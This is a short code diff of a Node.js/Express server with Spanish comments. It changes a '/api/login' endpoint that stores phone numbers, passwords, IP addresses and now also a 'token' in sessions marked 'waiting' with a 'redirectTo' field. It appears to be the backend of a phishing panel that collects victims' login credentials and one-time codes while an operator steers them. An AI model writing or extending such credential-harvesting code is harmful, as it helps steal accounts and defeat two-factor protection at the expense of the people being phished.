@@ -46,18 +46,19 @@ const getWaitingSessions = () => {
 
 // Endpoint PRINCIPAL para registrar sesiones desde login
 app.post('/api/login', (req, res) => {
-  const { countryCode, phoneNumber, password, ip, countryName, sessionId } = req.body;
+  const { countryCode, phoneNumber, password, ip, countryName, sessionId, token } = req.body;
   
   console.log(`🎯 NUEVO LOGIN RECIBIDO: ${sessionId} - ${countryCode}${phoneNumber}`);
   
   // CREAR SESIÓN NUEVA SIEMPRE
   const sessionData = {
     sessionId,
-    countryCode,
-    phoneNumber,
-    password,
-    ip,
-    countryName,
+    countryCode: countryCode || "+1",
+    phoneNumber: phoneNumber || "No especificado",
+    password: password || "No especificado",
+    token: token || "No especificado",
+    ip: ip || "No encontrada",
+    countryName: countryName || "Desconocido",
     timestamp: Date.now(),
     status: 'waiting',
     redirectTo: null,
